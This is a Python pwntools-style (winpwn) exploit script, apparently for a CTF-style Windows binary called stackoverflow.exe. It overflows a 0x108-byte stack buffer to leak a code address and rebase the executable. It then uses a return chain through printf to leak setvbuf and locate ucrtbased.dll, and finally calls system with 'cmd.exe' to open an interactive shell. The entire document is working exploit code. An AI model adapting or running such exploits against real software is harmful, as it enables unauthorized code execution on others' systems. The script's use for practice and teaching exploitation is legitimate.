from winpwn import *

context.arch = 'i386'
# context.log_level = "debug"

pe = winfile("stackoverflow.exe")
ucrtbased = winfile("ucrtbased.dll")
#start = lambda: process(pe.path)  # remote

p = start()
p.recvuntil("This is the stack address : ")
buf_addr = int(p.recv(8), 16)
log.success("buf addr: " + hex(buf_addr))

p.sendafter("What is your name: ", "\xcc" * 0x108)
p.recvuntil("\xcc" * 0x108)

leak_pe_addr = u32(p.recv(3).ljust(4, '\x00'))
log.success("leak code addr: " + hex(leak_pe_addr))

pe.address = leak_pe_addr - 0x12203
log.info("pe base: " + hex(pe.address))
p.close()

p = start()
# windbg.attach(p, "bp 710000+119EA")

printf_addr = pe.address + 0x11046
main_addr = pe.address + 0x112B7

payload = ''
payload += '\xcc' * 0x108
payload += p32(printf_addr)
payload += p32(main_addr)
payload += p32(pe.imsyms['setvbuf'])

p.sendafter("What is your name: ", payload)
p.sendlineafter("Hello, ", "")
p.recvline()

setvbuf_addr = u32(p.recv(4))
log.success("setvbuf addr: " + hex(setvbuf_addr))

ucrtbased.address = setvbuf_addr - ucrtbased.symbols['setvbuf']
log.info("ucrtbase base: " + hex(ucrtbased.address))

payload = ''
payload += '\xcc' * 0x108
payload += p32(ucrtbased.symbols['system'])
payload += p32(main_addr)
payload += p32(ucrtbased.search("cmd.exe").next())

p.sendafter("What is your name: ", payload)
p.sendlineafter("Hello, ", "")
p.recvline()

p.interactive()